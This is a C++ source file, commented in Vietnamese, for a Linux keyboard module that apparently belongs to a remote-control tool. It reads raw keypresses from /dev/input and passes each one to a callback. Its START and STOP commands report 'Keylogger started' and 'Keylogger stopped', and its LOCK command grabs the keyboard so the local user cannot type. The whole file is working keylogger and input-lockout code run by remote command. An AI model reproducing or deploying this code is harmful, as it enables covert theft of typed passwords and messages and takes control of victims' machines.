#include "modules/KeyManager.hpp"
#include <iostream>
#include <vector>
#include <map>
#include <atomic>
#include <thread>
#include <mutex>
#include <algorithm>
#include <cstring>

// Linux specific headers
#include <fcntl.h>      // open
#include <unistd.h>     // close, read, write
#include <dirent.h>     // scandir
#include <linux/input.h>// input_event, KEY_*, EVIOCGRAB
#include <sys/ioctl.h>  // ioctl

// ============================================================
// PHẦN BIẾN TOÀN CỤC (GLOBAL)
// ============================================================
static KeyCallback g_callback = nullptr;
static std::atomic<bool> g_running{false};
static std::atomic<bool> g_isLocked{false}; // Trạng thái khóa
static int g_fd = -1; // File descriptor của thiết bị bàn phím

// Biến theo dõi trạng thái phím bổ trợ để xử lý tổ hợp phím
static bool g_ctrl_pressed = false;
static bool g_alt_pressed = false;

// Map ánh xạ mã phím Linux sang String
static std::map<int, std::string> g_keyMap = {
    {KEY_A, "a"}, {KEY_B, "b"}, {KEY_C, "c"}, {KEY_D, "d"}, {KEY_E, "e"},
    {KEY_F, "f"}, {KEY_G, "g"}, {KEY_H, "h"}, {KEY_I, "i"}, {KEY_J, "j"},
    {KEY_K, "k"}, {KEY_L, "l"}, {KEY_M, "m"}, {KEY_N, "n"}, {KEY_O, "o"},
    {KEY_P, "p"}, {KEY_Q, "q"}, {KEY_R, "r"}, {KEY_S, "s"}, {KEY_T, "t"},
    {KEY_U, "u"}, {KEY_V, "v"}, {KEY_W, "w"}, {KEY_X, "x"}, {KEY_Y, "y"}, {KEY_Z, "z"},
    {KEY_1, "1"}, {KEY_2, "2"}, {KEY_3, "3"}, {KEY_4, "4"}, {KEY_5, "5"},
    {KEY_6, "6"}, {KEY_7, "7"}, {KEY_8, "8"}, {KEY_9, "9"}, {KEY_0, "0"},
    {KEY_ENTER, "\n"}, {KEY_KPENTER, "\n"},
    {KEY_SPACE, " "}, {KEY_BACKSPACE, "[BACK]"},
    {KEY_TAB, "[TAB]"}, {KEY_ESC, "[ESC]"}, 
    {KEY_LEFTSHIFT, "[SHIFT]"}, {KEY_RIGHTSHIFT, "[SHIFT]"},
    {KEY_LEFTCTRL, "[CTRL]"}, {KEY_RIGHTCTRL, "[CTRL]"},
    {KEY_LEFTALT, "[ALT]"}, {KEY_RIGHTALT, "[ALT]"},
    {KEY_DOT, "."}, {KEY_COMMA, ","}, {KEY_MINUS, "-"}, {KEY_EQUAL, "="},
    {KEY_SLASH, "/"}, {KEY_SEMICOLON, ";"}, {KEY_APOSTROPHE, "'"},
    {KEY_CAPSLOCK, "[CAPS]"}, 
    {KEY_UP, "[UP]"}, {KEY_DOWN, "[DOWN]"}, {KEY_LEFT, "[LEFT]"}, {KEY_RIGHT, "[RIGHT]"}
};

// ============================================================
// CÁC HÀM HELPER (NỘI BỘ)
// ============================================================

// Tìm thiết bị bàn phím trong /dev/input/by-path/
// Cách này ổn định hơn là đoán event0, event1...
std::string find_keyboard_device() {
    const std::string path_dir = "/dev/input/by-path/";
    DIR* dir = opendir(path_dir.c_str());
    if (!dir) return ""; // Không mở được thư mục

    struct dirent* entry;
    std::string device_path = "";

    while ((entry = readdir(dir)) != NULL) {
        std::string filename = entry->d_name;
        // Tìm file kết thúc bằng "-event-kbd" -> Đây thường là bàn phím vật lý
        if (filename.length() > 10 && 
            filename.substr(filename.length() - 10) == "-event-kbd") {
            device_path = path_dir + filename;
            break;
        }
    }
    closedir(dir);
    
    // Fallback nếu không tìm thấy by-path (thường xảy ra trên máy ảo hoặc docker)
    if (device_path.empty()) {
        // Thử mở event0 (thường là keyboard trên nhiều hệ thống đơn giản)
        // Trong thực tế nên check /proc/bus/input/devices để chính xác hơn
        return "/dev/input/event0"; 
    }
    return device_path;
}

// Vòng lặp chính xử lý sự kiện
void hook_loop() {
    std::string dev_path = find_keyboard_device();
    std::cout << "[KEYBOARD] Opening device: " << dev_path << "\n";

    // Phải mở file với quyền root (sudo)
    g_fd = open(dev_path.c_str(), O_RDONLY);
    if (g_fd == -1) {
        std::cerr << "[KEYBOARD] ERROR: Cannot open device (Run as Root/Sudo?)\n";
        g_running = false;
        return;
    }

    struct input_event ev;
    
    while (g_running) {
        // Đọc blocking, sẽ dừng ở đây chờ phím nhấn
        ssize_t n = read(g_fd, &ev, sizeof(ev));
        
        // Nếu lỗi hoặc bị đóng file (do stop_hook)
        if (n == (ssize_t)-1 || !g_running) {
            break; 
        }

        // Chỉ xử lý sự kiện Key (EV_KEY)
        if (ev.type == EV_KEY) {
            // value: 0 = Release, 1 = Press, 2 = Hold (Repeat)
            bool is_pressed = (ev.value == 1); // Chỉ lấy sự kiện nhấn xuống

            // 1. Cập nhật trạng thái phím bổ trợ (cho logic Unlock)
            if (ev.code == KEY_LEFTCTRL || ev.code == KEY_RIGHTCTRL) g_ctrl_pressed = (ev.value != 0);
            if (ev.code == KEY_LEFTALT || ev.code == KEY_RIGHTALT)   g_alt_pressed = (ev.value != 0);

            // 2. Logic UNLOCK KHẨN CẤP: Ctrl + Alt + U
            if (g_isLocked && is_pressed && (ev.code == KEY_U)) {
                if (g_ctrl_pressed && g_alt_pressed) {
                    KeyManager::set_locked(false);
                    std::cout << "[KEYBOARD] EMERGENCY UNLOCK TRIGGERED!\n";
                    continue;
                }
            }

            // 3. Xử lý Callback (Gửi phím)
            if (is_pressed && g_keyMap.count(ev.code)) {
                std::string key = g_keyMap[ev.code];
                
                // Nếu đang giữ Shift và là chữ cái -> Viết hoa (Logic đơn giản)
                // (Thực tế cần xử lý phức tạp hơn nhưng tạm thời thế này là đủ demo)
                /* // Logic viết hoa đơn giản (Optional)
                if (key.length() == 1 && key[0] >= 'a' && key[0] <= 'z') {
                   // check shift state...
                }
                */

                if (g_callback) {
                    g_callback(key);
                }
            }
        }
    }

    // Dọn dẹp
    if (g_fd != -1) {
        // Đảm bảo mở khóa trước khi đóng file, tránh làm tê liệt bàn phím vĩnh viễn
        ioctl(g_fd, EVIOCGRAB, 0); 
        close(g_fd);
        g_fd = -1;
    }
    std::cout << "[KEYBOARD] Loop finished.\n";
}

// ============================================================
// IMPLEMENT CLASS KEYMANAGER
// ============================================================

const std::string& KeyManager::get_module_name() const { 
    static const std::string name = "KEYBOARD"; 
    return name; 
}

void KeyManager::set_callback(KeyCallback cb) {
    g_callback = cb;
}

void KeyManager::set_locked(bool locked) {
    g_isLocked = locked;
    if (g_fd != -1) {
        // EVIOCGRAB: 1 = Grab (Khóa, chỉ mình tôi nghe), 0 = Ungrab (Mở)
        int result = ioctl(g_fd, EVIOCGRAB, locked ? 1 : 0);
        if (result == 0) {
            std::cout << "[KEYBOARD] Lock state changed to: " << (locked ? "LOCKED" : "UNLOCKED") << "\n";
        } else {
            std::cerr << "[KEYBOARD] Failed to change lock state. (Are you Root?)\n";
        }
    }
}

void KeyManager::start_hook() {
    if (g_running) return;
    
    // Reset trạng thái
    g_running = true;
    g_isLocked = false;
    g_ctrl_pressed = false;
    g_alt_pressed = false;
    
    hookThread = std::thread(hook_loop);
    hookThread.detach(); 
}

void KeyManager::stop_hook() {
    if (!g_running) return;

    g_running = false;
    g_isLocked = false; // Luôn mở khóa khi stop để tránh mất bàn phím

    // Đóng file descriptor sẽ khiến hàm read() trong thread đang chờ bị ngắt và thoát vòng lặp
    if (g_fd != -1) {
        ioctl(g_fd, EVIOCGRAB, 0); // Ungrab trước khi đóng
        close(g_fd);
        g_fd = -1;
    }
}

json KeyManager::handle_command(const json& request) {
    std::string command = request.value("command", "");
    
    if (command == "START") {
        start_hook();
        return {
            {"status", "success"}, 
            {"message", "Keylogger started"}
        };
    }
    else if (command == "STOP") {
        stop_hook();
        return {
            {"status", "success"}, 
            {"message", "Keylogger stopped"}
        };
    }
    // Lệnh LOCK
    else if (command == "LOCK") {
        if (!g_running) start_hook(); // Phải start thì mới có fd để Grab
        // Chờ 1 chút để fd được mở nếu vừa start
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
        
        set_locked(true);
        return {
            {"status", "success"}, 
            {"message", "Keyboard LOCKED (Ctrl+Alt+U to unlock)"}
        };
    }
    // Lệnh UNLOCK
    else if (command == "UNLOCK") {
        set_locked(false);
        return {
            {"status", "success"}, 
            {"message", "Keyboard UNLOCKED"}
        };
    }

    return {
        {"status", "error"}, 
        {"message", "Unknown command"}
    };
}